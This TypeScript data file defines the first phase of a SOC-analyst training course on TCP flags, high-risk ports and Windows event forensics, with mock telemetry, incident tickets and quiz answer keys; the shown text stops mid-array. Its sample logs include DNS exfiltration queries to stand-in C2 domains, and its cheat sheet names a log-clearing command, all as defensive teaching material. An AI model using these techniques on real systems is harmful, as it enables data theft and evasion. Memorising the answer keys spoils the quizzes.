import { Phase } from '../../types/curriculum';

export const phase1: Phase = {
  id: 'phase-1',
  phaseNumber: 1,
  title: 'Core Networking & Operating System Telemetry',
  description: 'Master packet encapsulation, TCP handshakes, enterprise high-risk ports, and low-level Windows/Linux host forensics.',
  iconName: 'Network',
  badgeColor: 'border-cyan-500/30 text-cyan-400 bg-cyan-500/10',
  topics: [
    {
      id: 'osi-tcpip',
      phaseId: 'phase-1',
      title: 'OSI vs TCP/IP in Enterprise Architecture',
      subtitle: 'Packet Encapsulation, 3-Way Handshake, TCP Flags, & Wire Forensics',
      estimatedMinutes: 25,
      iconName: 'Layers',
      analogy: {
        headline: 'The Global Postal & International Diplomatic Courier System',
        story: 'Imagine writing a top-secret business contract (Application Layer). Before sending, you seal it in a diplomatic envelope with tamper-evident wax (Transport Layer / Port numbers). Next, the embassy puts that envelope inside a courier pouch labeled with the destination country and city address (Network Layer / IP addresses). Finally, a delivery van physically drives the pouch across asphalt roads through security check gates (Data Link & Physical Layer / MAC addresses and Ethernet frames). Each layer adds its own protective envelope (encapsulation) on the way out, and strips it open (decapsulation) on the way in. If any seal is broken or an envelope is missing the proper stamp, security guards immediately halt the delivery.',
        keyTakeaway: 'In the SOC, when an alert fires, you must know at which layer of the envelope the adversary operated. A firewall inspects Layers 3 and 4; a WAF inspects Layer 7; a packet capture (PCAP) inspects all layers from Ethernet header down to raw payload.'
      },
      corporateReality: {
        headline: 'Stateful Firewalls, TCP Handshakes, and Wire-Speed Anomaly Detection',
        deepDive: ["Enterprise perimeter defenses rely on stateful connection tables. The TCP 3-way handshake establishes a synchronized session: Client sends [SYN] with an Initial Sequence Number (ISN); Server responds with [SYN-ACK] acknowledging the client ISN and offering its own; Client completes with [ACK]. Once established, data flows. Attackers manipulate TCP control flags: [RST] (Reset) violently tears down connections or scans without completing sessions; [FIN] cleanly closes sessions; [PSH] (Push) forces the receiving buffer to process data immediately (frequently used in interactive C2 shells); and [URG] marks emergency data. In SYN Flood DoS attacks, adversaries flood millions of spoofed [SYN] packets, exhausting the server connection backlog queue. Enterprise mitigation utilizes SYN Cookies, micro-blocks, and Next-Gen Firewall (NGFW) TCP state validation."].join('\n'),
        architectureNotes: [
          'Layer 2 (Data Link): Switch CAM tables, ARP poison detection, VLAN tagging (802.1Q).',
          'Layer 3 (Network): Router ACLs, BGP routing anomalies, IP spoofing prevention (uRPF).',
          'Layer 4 (Transport): Stateful session tables in Fortinet/Palo Alto firewalls, TCP sequence prediction defense.',
          'Layer 7 (Application): TLS 1.3 decryption proxies, HTTP request smuggling detection, application-layer rate limiting.'
        ],
        realWorldCase: 'During an advanced threat simulation against a major bank, attackers initiated a stealthy "Half-Open" SYN scan across 10.0.0.0/16. Because no full connection was completed (no ACK sent), legacy application servers logged zero events. Only the Zeek/Suricata IDS inspecting Layer 4 flags flagged thousands of orphaned SYN packets lacking corresponding ACK responses.'
      },
      cheatSheet: {
        title: 'TCP Flags & Enterprise Wire Defense Cheat Sheet',
        description: 'Crucial TCP flags, bit values, Wireshark filter syntax, and SOC triage implications.',
        headers: ['TCP Flag', 'Bit Value', 'Wireshark Filter', 'Normal Function', 'SOC Anomaly / Threat Indicator'],
        rows: [
          {
            term: 'SYN (Synchronize)',
            description: 'Initiates 3-way handshake with initial sequence number.',
            commandOrId: 'tcp.flags.syn == 1 && tcp.flags.ack == 0',
            riskOrUsage: 'Massive SYN rates from single or spoofed IPs indicate SYN Flood DoS or SYN Stealth Port Scanning (nmap -sS).',
            severity: 'High'
          },
          {
            term: 'SYN-ACK',
            description: 'Server acknowledgement and reciprocal sync.',
            commandOrId: 'tcp.flags.syn == 1 && tcp.flags.ack == 1',
            riskOrUsage: 'If received without preceding SYN from internal host, indicates unsolicited response or reflection attack.',
            severity: 'Medium'
          },
          {
            term: 'ACK (Acknowledge)',
            description: 'Confirms receipt of data or completes handshake.',
            commandOrId: 'tcp.flags.ack == 1',
            riskOrUsage: 'ACK scanning (nmap -sA) used to map stateful firewall rules without triggering simple connection logs.',
            severity: 'Low'
          },
          {
            term: 'RST (Reset)',
            description: 'Abruptly aborts connection; rejects connection to closed port.',
            commandOrId: 'tcp.flags.reset == 1',
            riskOrUsage: 'Sudden spike of RST packets indicates firewall dropping sessions, port scan hitting closed ports, or TCP session hijacking.',
            severity: 'High'
          },
          {
            term: 'PSH (Push)',
            description: 'Bypasses buffer and pushes data straight to application.',
            commandOrId: 'tcp.flags.push == 1',
            riskOrUsage: 'Heavily observed in reverse interactive shells (Netcat, Meterpreter) sending keystrokes one by one.',
            severity: 'Medium'
          },
          {
            term: 'FIN (Finished)',
            description: 'Graceful shutdown initiated by sender.',
            commandOrId: 'tcp.flags.fin == 1',
            riskOrUsage: 'FIN Scanning (nmap -sF) bypasses non-stateful packet filters.',
            severity: 'Low'
          }
        ]
      },
      sandboxType: 'wireshark',
      sandboxConfig: {
        title: 'Wireshark Packet Stream Inspector',
        instructions: 'Filter real packet streams using Wireshark display filters (e.g. `tcp.flags.syn == 1`, `tcp.flags.reset == 1`, `ip.addr == 192.168.1.105`). Inspect packet byte details and diagnose anomalous connections.',
        defaultData: {
          packets: [
            { id: 1, time: '0.000000', src: '192.168.1.105', dst: '10.0.4.15', proto: 'TCP', length: 66, info: '49201 → 443 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256', flags: { syn: 1, ack: 0, rst: 0, fin: 0, psh: 0 } },
            { id: 2, time: '0.001240', src: '10.0.4.15', dst: '192.168.1.105', proto: 'TCP', length: 66, info: '443 → 49201 [SYN, ACK] Seq=0 Ack=1 Win=65535 Len=0 MSS=1460', flags: { syn: 1, ack: 1, rst: 0, fin: 0, psh: 0 } },
            { id: 3, time: '0.001450', src: '192.168.1.105', dst: '10.0.4.15', proto: 'TCP', length: 54, info: '49201 → 443 [ACK] Seq=1 Ack=1 Win=64240 Len=0', flags: { syn: 0, ack: 1, rst: 0, fin: 0, psh: 0 } },
            { id: 4, time: '0.045000', src: '192.168.1.105', dst: '10.0.4.15', proto: 'TLSv1.3', length: 517, info: 'Client Hello, Session ID, Cipher Suites', flags: { syn: 0, ack: 1, rst: 0, fin: 0, psh: 1 } },
            { id: 5, time: '0.098000', src: '203.0.113.88', dst: '10.0.4.15', proto: 'TCP', length: 60, info: '61220 → 445 [SYN] Seq=1092837 Win=1024 Len=0', flags: { syn: 1, ack: 0, rst: 0, fin: 0, psh: 0 } },
            { id: 6, time: '0.098100', src: '10.0.4.15', dst: '203.0.113.88', proto: 'TCP', length: 54, info: '445 → 61220 [RST, ACK] Seq=1 Ack=1092838 Win=0 Len=0', flags: { syn: 0, ack: 1, rst: 1, fin: 0, psh: 0 } },
            { id: 7, time: '0.102000', src: '203.0.113.88', dst: '10.0.4.15', proto: 'TCP', length: 60, info: '61221 → 3389 [SYN] Seq=1092838 Win=1024 Len=0', flags: { syn: 1, ack: 0, rst: 0, fin: 0, psh: 0 } },
            { id: 8, time: '0.102100', src: '10.0.4.15', dst: '203.0.113.88', proto: 'TCP', length: 54, info: '3389 → 61221 [RST, ACK] Seq=1 Ack=1092839 Win=0 Len=0', flags: { syn: 0, ack: 1, rst: 1, fin: 0, psh: 0 } },
            { id: 9, time: '0.105000', src: '203.0.113.88', dst: '10.0.4.15', proto: 'TCP', length: 60, info: '61222 → 22 [SYN] Seq=1092839 Win=1024 Len=0', flags: { syn: 1, ack: 0, rst: 0, fin: 0, psh: 0 } },
            { id: 10, time: '0.105150', src: '10.0.4.15', dst: '203.0.113.88', proto: 'TCP', length: 54, info: '22 → 61222 [RST, ACK] Seq=1 Ack=1092840 Win=0 Len=0', flags: { syn: 0, ack: 1, rst: 1, fin: 0, psh: 0 } }
          ]
        }
      },
      incident: {
        id: 'inc-1049',
        ticketNumber: 'SEC-1049',
        title: 'Abnormal TCP RST Storm & Unsolicited SYN Probing on DMZ Gateway',
        severity: 'High',
        affectedAsset: 'DMZ-GW-01 (10.0.4.15)',
        timestamp: '2026-10-03 14:22:18 UTC',
        summary: 'Palo Alto Perimeter Firewall generated Alert PA-THREAT-802: Host 203.0.113.88 generated 1,420 connection attempts in 60 seconds with no ACK completions, triggering 1,390 RST responses from DMZ gateway.',
        rawTelemetry: [
          '2026-10-03T14:22:01Z FW-EDGE-01 src=203.0.113.88:51240 dst=10.0.4.15:21 proto=TCP action=deny reason=RST_SENT',
          '2026-10-03T14:22:02Z FW-EDGE-01 src=203.0.113.88:51241 dst=10.0.4.15:22 proto=TCP action=deny reason=RST_SENT',
          '2026-10-03T14:22:03Z FW-EDGE-01 src=203.0.113.88:51242 dst=10.0.4.15:23 proto=TCP action=deny reason=RST_SENT',
          '2026-10-03T14:22:04Z FW-EDGE-01 src=203.0.113.88:51243 dst=10.0.4.15:445 proto=TCP action=deny reason=RST_SENT',
          '2026-10-03T14:22:05Z FW-EDGE-01 src=203.0.113.88:51244 dst=10.0.4.15:3389 proto=TCP action=deny reason=RST_SENT'
        ],
        triageOptions: {
          correctClassification: 'True Positive',
          explanation: 'External unauthenticated entity is actively performing an automated horizontal TCP SYN port reconnaissance scan against closed administrative ports.'
        },
        rootCauseOptions: {
          options: [
            'Adversary conducting aggressive TCP SYN port scanning (e.g. nmap -sS) across administrative ports.',
            'Misconfigured internal backup script attempting FTP and SSH synchronization.',
            'Legitimate customer browser experiencing network packet jitter and NAT expiration.',
            'DNS amplification DDoS attack reflecting UDP queries off DMZ router.'
          ],
          correctIndex: 0,
          explanation: 'The sequential port increments (21, 22, 23, 445, 3389) with SYN flags and immediate RST responses confirm an automated TCP SYN port scan tool like Nmap.'
        },
        containmentOptions: {
          options: [
            'Temporarily reboot the DMZ gateway to clear TCP connection tables.',
            'Implement immediate dynamic IP block at perimeter firewall for source 203.0.113.88 and verify no internal hosts initiated outbound callbacks.',
            'Allow the scan to complete to log all targeted ports for threat intelligence research.',
            'Disable TCP reset responses globally across all production web servers.'
          ],
          correctIndex: 1,
          explanation: 'Best practice containment: Block malicious source IP at the edge firewall, review logs to ensure no ports returned SYN-ACK (open), and verify no internal C2 beaconing exists.'
        },
        mitreTechniques: ['T1046 - Network Service Discovery', 'T1595.001 - Active Scanning: Scanning IP Blocks'],
        slaMinutes: 30
      },
      flashcards: [
        {
          id: 'fc-1-1',
          question: 'What is the precise sequence of TCP flags exchanged during a normal 3-way handshake, and what happens if the server receives a SYN on a closed port?',
          category: 'Core Networking',
          difficulty: 'Junior',
          modelAnswer: 'A normal 3-way handshake begins with the client sending a SYN packet with Initial Sequence Number (ISN_c). The server responds with SYN-ACK, acknowledging ISN_c+1 and supplying its own ISN_s. The client sends ACK with ISN_s+1, completing the connection. If the server port is closed, the operating system kernel immediately responds with a TCP RST (Reset) packet with the ACK flag set, aborting the attempt.',
          scoringTips: ['Mention SYN, SYN-ACK, ACK sequence.', 'Highlight Sequence and Acknowledgment number incrementation (+1).', 'State that closed ports reply with RST/ACK.'],
          corporateContext: 'SOC Tier 1 interviewers test this to see if you understand PCAP wire reality versus textbook memorization.'
        },
        {
          id: 'fc-1-2',
          question: 'Why do attackers prefer a SYN Stealth Scan (nmap -sS) over a full TCP Connect Scan (-sT)?',
          category: 'Network Defense',
          difficulty: 'Mid',
          modelAnswer: 'A TCP Connect scan (-sT) utilizes the OS socket API and completes the full 3-way handshake (SYN -> SYN-ACK -> ACK). This causes the target application layer (e.g., Apache, Nginx, IIS) to log a new connection event. A SYN Stealth scan (-sS) sends raw SYN packets, receives SYN-ACK (if open), and immediately transmits a RST packet rather than completing with ACK. Because the session was never established, application-level logging is bypassed, leaving only Layer 4 network telemetry.',
          scoringTips: ['Explains half-open mechanism (SYN -> SYN-ACK -> RST).', 'Explains that application-level services do not log incomplete connections.', 'Mentions that modern IDS/IPS and NGFWs still detect it at Layer 4.'],
          corporateContext: 'Essential distinction for detection engineers writing Zeek or Suricata network signatures.'
        },
        {
          id: 'fc-1-3',
          question: 'What is the difference between Layer 3 routing inspection and Layer 7 deep packet inspection in an enterprise SOC?',
          category: 'Architecture',
          difficulty: 'Mid',
          modelAnswer: 'Layer 3 inspection examines IP headers (Source IP, Destination IP, Protocol type, TTL) to make stateless routing and ACL permit/deny decisions. Layer 7 Deep Packet Inspection (DPI) reassembles TCP streams and parses application-layer payloads (HTTP headers, URL paths, user-agent strings, DNS query names, TLS certificates). DPI allows detection of SQL injection, webshell traffic, and data exfiltration inside encrypted or standard protocol payloads.',
          scoringTips: ['Contrast IP address filtering with application payload inspection.', 'Mention reassembly and protocol decoders.', 'Provide examples like HTTP/DNS payload analysis.'],
          corporateContext: 'Used when deciding whether to route traffic through Next-Generation Firewalls with TLS decryption.'
        }
      ],
      quiz: [
        {
          id: 'q-1-1',
          question: 'In a Wireshark packet capture, you observe an external IP sending thousands of TCP packets with SYN=1 and ACK=0, but the target server responds with RST=1 and ACK=1. What does this indicate?',
          options: [
            'The client is streaming video and buffering frames.',
            'The client is scanning ports that are currently closed or firewalled to reject.',
            'The server is successfully serving web traffic on port 443.',
            'A DNS amplification attack is overflowing the router.'
          ],
          correctIndex: 1,
          explanation: 'When a TCP SYN packet arrives at an inactive or closed port, the host operating system responds with RST/ACK to refuse the connection attempt.'
        },
        {
          id: 'q-1-2',
          question: 'Which TCP flag is frequently observed during active interactive reverse command shells to force immediate buffer delivery of single keystrokes?',
          options: ['URG (Urgent)', 'FIN (Finish)', 'PSH (Push)', 'SYN (Synchronize)'],
          correctIndex: 2,
          explanation: 'The PSH (Push) flag instructs the TCP stack to flush its send buffer and deliver data immediately to the receiving application without waiting for a full packet buffer.'
        },
        {
          id: 'q-1-3',
          question: 'Why would an enterprise SOC analyst inspect the TTL (Time-to-Live) field in an IP header during an investigation?',
          options: [
            'To verify the cryptographic signature of the payload.',
            'To calculate the bandwidth cost of the TCP session.',
            'To identify operating system fingerprinting and detect IP address spoofing or intermediate proxy hops.',
            'To determine the expiration timestamp of the user Active Directory password.'
          ],
          correctIndex: 2,
          explanation: 'Default initial TTL values differ by OS (Windows=128, Linux/macOS=64, Cisco=255). Anomalous TTL shifts can reveal IP spoofing or unauthorized transparent proxies.'
        }
      ]
    },
    {
      id: 'critical-ports',
      phaseId: 'phase-1',
      title: 'Critical Enterprise Ports & Attack Surface',
      subtitle: 'Port 21, 22, 53 (DNS Tunneling), 88 (Kerberos), 389, 445 (SMB), & 3389 (RDP)',
      estimatedMinutes: 30,
      iconName: 'Server',
      analogy: {
        headline: 'The High-Security Corporate HQ Access Gates',
        story: 'Think of an enterprise network as a massive corporate skyscraper with 65,535 designated doors. Door 80 and 443 are revolving glass doors in the main lobby, open to every customer. Door 22 is an encrypted biometric service elevator for datacenter engineers. Door 53 is the mail room directory phone line where people ask for department room numbers. Door 88 is the ID badge issuer validating corporate security credentials. Door 445 is the cargo loading dock for moving heavy office files between desks. If a rogue visitor tries to sneak into Door 3389 (Remote Desktop) or smuggles secret company documents disguised as quick phone calls out Door 53 (DNS Tunneling), alarms must immediately trigger.',
        keyTakeaway: 'Default standard ports tell you what protocol was intended, but attackers abuse standard ports (like 53 and 445) to bypass edge controls and move laterally.'
      },
      corporateReality: {
        headline: 'Perimeter Hardening, Lateral Movement Vectors, and Protocol Abuse',
        deepDive: ["In a hardened corporate network, ports are strictly segregated into security zones (External/DMZ, Corporate LAN, Datacenter Server Farm, Crown Jewels). Port 445 (SMB) is the #1 vector for internal ransomware propagation (EternalBlue MS17-010, PsExec, and Pass-the-Hash). Port 88 (Kerberos) is targeted by Kerberoasting to extract service account ticket hashes (TGS-REQ) for offline cracking with Hashcat. Port 53 (DNS) is notoriously exploited for Command & Control (C2) and data exfiltration via DNS Tunneling (tools like dnscat2 or Cobalt Strike), encoding base64 data inside high-entropy TXT and A record queries that slip straight past firewalls. Port 3389 (RDP) must NEVER be exposed directly to the public internet; enterprise environments mandate hardened Jump Hosts / Bastions behind multi-factor authentication (MFA)."].join('\n'),
        architectureNotes: [
          'Zero Trust Segmentation: Block workstation-to-workstation Port 445/3389 via Host-based Windows Defender Firewall.',
          'DNS Inspection: Enforce corporate recursive DNS forwarders (e.g. Infoblox / Cisco Umbrella) with Response Policy Zones (RPZ) to kill tunneling.',
          'Active Directory Tiering: Protect Port 88 (Kerberos) and 389 (LDAP) Domain Controllers within isolated Management Tier 0.',
          'Egress Filtering: Deny all outbound traffic except through explicit corporate HTTP/S inspection proxies.'
        ],
        realWorldCase: 'The 2017 NotPetya global cyber incident propagated in under 7 minutes across global enterprise branches by abusing open Port 445 (SMB) via EternalBlue and memory credential harvesting, crippling multinational shipping operations.'
      },
      cheatSheet: {
        title: 'High-Risk Enterprise Ports & Threat Matrix',
        description: 'Standard ports, transport protocol, primary enterprise role, common adversary exploit, and recommended SOC detection logic.',
        headers: ['Port', 'Protocol', 'Primary Service', 'Adversary Exploit / TTP', 'SOC Detection Rule'],
        rows: [
          {
            term: 'Port 53',
            description: 'Domain Name System (DNS)',
            commandOrId: 'UDP/TCP 53',
            riskOrUsage: 'DNS Tunneling / Data Exfiltration (Cobalt Strike, dnscat2), DGA C2 domains.',
            severity: 'Critical'
          },
          {
            term: 'Port 88',
            description: 'Kerberos Authentication',
            commandOrId: 'TCP/UDP 88',
            riskOrUsage: 'Kerberoasting (TGS ticket requests with RC4 encryption), AS-REP Roasting.',
            severity: 'High'
          },
          {
            term: 'Port 389 / 636',
            description: 'LDAP / LDAPS',
            commandOrId: 'TCP 389, 636',
            riskOrUsage: 'Reconnaissance via BloodHound / SharpHound, credential scraping on cleartext 389.',
            severity: 'High'
          },
          {
            term: 'Port 445',
            description: 'Server Message Block (SMB)',
            commandOrId: 'TCP 445',
            riskOrUsage: 'PsExec lateral movement, EternalBlue (CVE-2017-0144), Pass-the-Hash, Ransomware spread.',
            severity: 'Critical'
          },
          {
            term: 'Port 3389',
            description: 'Remote Desktop Protocol (RDP)',
            commandOrId: 'TCP/UDP 3389',
            riskOrUsage: 'Brute-force attacks, BlueKeep (CVE-2019-0708), unauthorized administrator interactive sessions.',
            severity: 'Critical'
          },
          {
            term: 'Port 22',
            description: 'Secure Shell (SSH)',
            commandOrId: 'TCP 22',
            riskOrUsage: 'SSH tunneling/pivoting to bypass firewalls, credential brute-forcing, stolen SSH key reuse.',
            severity: 'Medium'
          }
        ]
      },
      sandboxType: 'ports',
      sandboxConfig: {
        title: 'Enterprise Traffic & DNS Tunneling Inspector',
        instructions: 'Inspect network connections by port, test query entropy on Port 53 for DNS tunneling, and examine lateral movement traffic on Port 445.',
        defaultData: {
          scenarios: [
            {
              port: 53,
              query: 'a8f4c9102b.exfil.evil-c2-corp.com',
              entropy: 4.85,
              length: 34,
              type: 'TXT',
              verdict: 'Malicious - DNS Tunneling Detected (High Entropy Subdomain)'
            },
            {
              port: 53,
              query: 'autodiscover.office365.com',
              entropy: 2.15,
              length: 27,
              type: 'A',
              verdict: 'Benign - Standard Microsoft M365 Service'
            },
            {
              port: 445,
              traffic: 'IPC$ -> \\\\10.0.1.55\\ADMIN$ -> PSEXESVC.exe transfer',
              protocol: 'SMB2',
              verdict: 'Critical - PsExec Administrative Remote Execution'
            }
          ]
        }
      },
      incident: {
        id: 'inc-1082',
        ticketNumber: 'SEC-1082',
        title: 'Abnormal High-Entropy DNS Exfiltration to Dynamic Subdomain',
        severity: 'Critical',
        affectedAsset: 'HR-PC-14 (192.168.10.84)',
        timestamp: '2026-10-03 16:45:00 UTC',
        summary: 'EDR and Internal DNS sinkhole detected 3,800 rapid TXT and A queries from single workstation to subdomains of update-sync-services[.]top over Port 53.',
        rawTelemetry: [
          '2026-10-03T16:44:10Z DNS-SRV-01 query=aW1wb3J0YW50X2ZpbmFuY2lhbHMx.update-sync-services.top type=TXT client=192.168.10.84',
          '2026-10-03T16:44:11Z DNS-SRV-01 query=cGFzc3dvcmRfaGFzaGVzX2V4ZmM.update-sync-services.top type=TXT client=192.168.10.84',
          '2026-10-03T16:44:12Z DNS-SRV-01 query=ZXhmaWx0cmF0aW9uX2Jsb2NrczM.update-sync-services.top type=TXT client=192.168.10.84',
          'Process: HR-PC-14 C:\\Users\\Public\\update.exe (PID: 4920) Parent: explorer.exe'
        ],
        triageOptions: {
          correctClassification: 'True Positive',
          explanation: 'Base64 encoded strings embedded in DNS subdomains with high query rates indicate active DNS Tunneling data exfiltration.'
        },
        rootCauseOptions: {
          options: [
            'Adversary utilizing DNS Tunneling / C2 exfiltration (Cobalt Strike / dnscat2) to bypass HTTP egress firewalls.',
            'Standard Windows OS checking for dynamic IP updates with local DHCP server.',
            'IT helpdesk running an authorized network stress test.',
            'Corrupted browser cache repeatedly requesting an expired CDN image.'
          ],
          correctIndex: 0,
          explanation: 'The decoded TXT subdomains reveal base64 text ("important_financials", "password_hashes"), confirming active data theft over DNS.'
        },
        containmentOptions: {
          options: [
            'Isolate HR-PC-14 via EDR host quarantine immediately, sinkhole update-sync-services[.]top at recursive DNS resolvers, and kill PID 4920.',
            'Ignore the alert because DNS is an approved corporate protocol that cannot be blocked.',
            'Send an email to the HR user asking if they installed an update software.',
            'Wait until the end of the shift to check if the data transfer stops on its own.'
          ],
          correctIndex: 0,
          explanation: 'Immediate containment requires EDR network isolation of the compromised endpoint to prevent further data loss, DNS sinkholing, and memory acquisition for forensics.'
        },
        mitreTechniques: ['T1071.004 - Application Layer Protocol: DNS', 'T1048.003 - Exfiltration Over Alternative Protocol: DNS Exfiltration'],
        slaMinutes: 15
      },
      flashcards: [
        {
          id: 'fc-1-4',
          question: 'What is DNS Tunneling, and how does a SOC analyst detect it in SIEM logs?',
          category: 'Threat Detection',
          difficulty: 'Mid',
          modelAnswer: 'DNS Tunneling encapsulates non-DNS protocol data (like C2 commands or stolen files) inside standard DNS query and response packets (commonly TXT or A records). Because firewalls usually allow Port 53 outbound freely, attackers exploit this. Analysts detect it by monitoring: 1) High query volume to a single root domain, 2) Abnormally high character length of subdomains, 3) High Shannon entropy (randomness/base64 strings), 4) Rare or anomalous record types (TXT/NULL), and 5) Failed NXDOMAIN spikes.',
          scoringTips: ['Explain encoding inside subdomains/TXT records.', 'Mention query volume and subdomain length.', 'Mention Shannon entropy and base64 detection.'],
          corporateContext: 'A signature interview question for demonstrating threat hunting acumen beyond simple static alerts.'
        },
        {
          id: 'fc-1-5',
          question: 'Why is Port 445 (SMB) heavily monitored and often blocked between internal user workstations?',
          category: 'Enterprise Defense',
          difficulty: 'Junior',
          modelAnswer: 'Port 445 is used for Server Message Block (SMB) file sharing, printer sharing, and named pipes. In corporate Windows environments, attackers exploit Port 445 for lateral movement using tools like PsExec (which writes an executable to ADMIN$ and creates a service via IPC$), Pass-the-Hash, or wormable exploits like EternalBlue. Modern Zero Trust architecture disables workstation-to-workstation Port 445 traffic via host-based firewalls, restricting SMB only between workstations and verified file servers.',
          scoringTips: ['Mention PsExec / IPC$ / ADMIN$.', 'Mention Pass-the-Hash and lateral movement.', 'Mention host-based firewall segmentation.'],
          corporateContext: 'Demonstrates understanding of Active Directory lateral movement mechanics.'
        },
        {
          id: 'fc-1-6',
          question: 'How does Kerberoasting attack Port 88, and what does the SOC see in Active Directory logs?',
          category: 'Active Directory Security',
          difficulty: 'Senior',
          modelAnswer: 'Any authenticated Active Directory domain user can request a Kerberos Ticket Granting Service (TGS) ticket for any Service Principal Name (SPN) registered to a domain account over Port 88. The ticket is encrypted with the NTLM hash of the target service account password. Attackers extract this ticket and crack it offline with Hashcat. In Windows Event logs, this triggers Event ID 4769 ("A Kerberos service ticket was requested") with Ticket Options 0x40810000 and Ticket Encryption Type 0x17 (RC4-HMAC), which is flagged when requested in bulk by standard user accounts.',
          scoringTips: ['Explain SPN requesting without special privileges.', 'Mention offline ticket cracking.', 'Mention Event ID 4769 and RC4 encryption (0x17).'],
          corporateContext: 'Crucial for Tier 2/3 analyst roles dealing with domain compromise detection.'
        }
      ],
      quiz: [
        {
          id: 'q-1-4',
          question: 'Which of the following ports should NEVER be exposed directly to the public internet on an enterprise perimeter firewall without VPN or Bastion Jump Host protection?',
          options: ['Port 443 (HTTPS)', 'Port 3389 (RDP)', 'Port 80 (HTTP)', 'Port 53 (DNS authoritative server)'],
          correctIndex: 1,
          explanation: 'Exposing Port 3389 (RDP) directly to the internet exposes the organization to continuous brute-force attacks, credential stuffing, and remote code execution vulnerabilities (such as BlueKeep).'
        },
        {
          id: 'q-1-5',
          question: 'What statistical metric is most effective for automated detection of DNS Tunneling subdomains?',
          options: [
            'Packet arrival latency',
            'Shannon Entropy of the requested subdomain string',
            'Number of IP addresses in the DNS answer',
            'HTTP User-Agent string length'
          ],
          correctIndex: 1,
          explanation: 'Shannon Entropy measures the degree of randomness in a string. Base64 or encrypted data encapsulated inside DNS queries has significantly higher entropy than normal human-readable domain names.'
        },
        {
          id: 'q-1-6',
          question: 'Which port and service is used by the PsExec utility to spawn remote processes during enterprise lateral movement?',
          options: ['Port 21 (FTP)', 'Port 445 (SMB)', 'Port 69 (TFTP)', 'Port 110 (POP3)'],
          correctIndex: 1,
          explanation: 'PsExec communicates over SMB (Port 445), connecting to the ADMIN$ administrative share and communicating through the IPC$ named pipe to start the PSEXESVC service.'
        }
      ]
    },
    {
      id: 'windows-telemetry',
      phaseId: 'phase-1',
      title: 'Windows Event Telemetry & Endpoint Forensics',
      subtitle: 'Event IDs 4624 (Logon Types), 4625 (Brute Force), 4688 (Process Lineage), & 7045 (Services)',
      estimatedMinutes: 30,
      iconName: 'ShieldAlert',
      analogy: {
        headline: 'The Skyscraper Keycard Logs & Security Camera Registry',
        story: 'When an employee arrives at corporate headquarters, they badge in at the turnstile (Event 4624 - Logon Type 2: Interactive at the physical door). If an offshore maintenance contractor dials into the HVAC console remotely from home, their badge displays a special orange guest visitor pass (Event 4624 - Logon Type 10: Remote Desktop). If an intruder tries 100 counterfeit keys in 30 seconds, the electronic lock buzzer screams (Event 4625 - Failed Logon). When the IT director authorizes a new contractor team and gives them a uniform, a formal badge audit record is created (Event 7045 - New Service Installed). Every action is permanently recorded in the master ledger.',
        keyTakeaway: 'The Windows Security Event Log is the bedrock of corporate endpoint detection. Mastering Logon Types and Process Creation command-lines allows you to detect intrusions without fancy tools.'
      },
      corporateReality: {
        headline: 'Active Directory Forensics, Sysmon, and Endpoint Detection & Response (EDR)',
        deepDive: ["Enterprise Windows logging relies on `Security.evtx` and `System.evtx`. Event ID 4624 is the most critical event. The key field is **Logon Type**:","- **Type 2 (Interactive):** Physical keyboard and monitor logon.","- **Type 3 (Network):** SMB share access, remote IPC$, or PsExec connection.","- **Type 10 (RemoteInteractive):** Remote Desktop Protocol (RDP).","- **Type 4 (Batch) / Type 5 (Service):** Automated scheduled tasks or system services.","- **Type 7 (Unlock):** Screen unlock.","- **Type 9 (NewCredentials):** RunAs with `/netonly` (heavily used during Pass-the-Hash).","Event ID 4625 logs failed attempts, where Status `0xC000006A` means \"Bad Password\" and `0xC0000064` means \"User does not exist\" (crucial for distinguishing user typo from account enumeration). Event ID 4688 logs process creation; with Command-Line Process Auditing enabled, it exposes parent-child relationships (e.g. `WINWORD.EXE` -> `cmd.exe` -> `powershell.exe -enc ...`). Event ID 7045 in System log detects newly registered Windows services (a favorite persistence technique)."].join('\n'),
        architectureNotes: [
          'GPO Auditing Baseline: Enforce "Audit Process Creation" with "Include command line in process creation events" via Group Policy.',
          'Sysmon Augmentation: Deploy Microsoft Sysmon for Event ID 1 (Process Create with MD5/SHA256 hashes), Event ID 3 (Network Connections), and Event ID 7 (Image Loading).',
          'WEF (Windows Event Forwarding): Centralize endpoint events to subscription servers before forwarding to SIEM.',
          'Honey Tokens: Deploy decoy service accounts with Event 4625/4624 monitoring for instant insider threat detection.'
        ],
        realWorldCase: 'During an attack investigation, the SOC detected 250 failed logins (Event 4625 Status 0xC000006A) against the backup admin account, immediately followed by an Event 4624 with Logon Type 3 originating from a compromised developer workstation. 12 seconds later, Event 7045 recorded the creation of service "SVC-WMI-HELPER" executing an encoded payload.'
      },
      cheatSheet: {
        title: 'Master Windows Security Event IDs & Logon Types',
        description: 'Crucial event IDs, logon types, and status codes for SOC analysts.',
        headers: ['Event ID / Code', 'Category', 'Description', 'Forensic Significance', 'Severity'],
        rows: [
          {
            term: 'Event ID 4624',
            description: 'Successful Logon',
            commandOrId: 'Security.evtx',
            riskOrUsage: 'Inspect Logon Type: Type 2 (Console), Type 3 (Network/SMB/Lateral), Type 10 (RDP).',
            severity: 'Low'
          },
          {
            term: 'Event ID 4625',
            description: 'Failed Logon',
            commandOrId: 'Security.evtx',
            riskOrUsage: 'Status 0xC000006A = Wrong password (Brute force/Password Spray). 0xC0000064 = Invalid user.',
            severity: 'Medium'
          },
          {
            term: 'Event ID 4688',
            description: 'Process Creation',
            commandOrId: 'Security.evtx / Sysmon 1',
            riskOrUsage: 'Captures full command-line arguments, parent process PID, and creator user SID.',
            severity: 'Medium'
          },
          {
            term: 'Event ID 7045',
            description: 'New Service Installed',
            commandOrId: 'System.evtx',
            riskOrUsage: 'Adversary persistence, PsExec service execution (PSEXESVC), privilege escalation.',
            severity: 'High'
          },
          {
            term: 'Event ID 4720',
            description: 'User Account Created',
            commandOrId: 'Security.evtx',
            riskOrUsage: 'Unauthorized local or domain user account backdoor creation.',
            severity: 'High'
          },
          {
            term: 'Event ID 1102 / 104',
            description: 'Audit Log Cleared',
            commandOrId: 'Security.evtx / System',
            riskOrUsage: 'Defense evasion (wevtutil cl Security). Almost always malicious or testing.',
            severity: 'Critical'
          }
        ]
      },
      sandboxType: 'windows-events',
      sandboxConfig: {
        title: 'Windows Event Viewer & Telemetry Forensics Console',
        instructions: 'Filter and inspect mock Windows Security.evtx records. Spot password spray attacks, inspect Logon Types, and decode suspicious command lines.',
        defaultData: {
          events: [
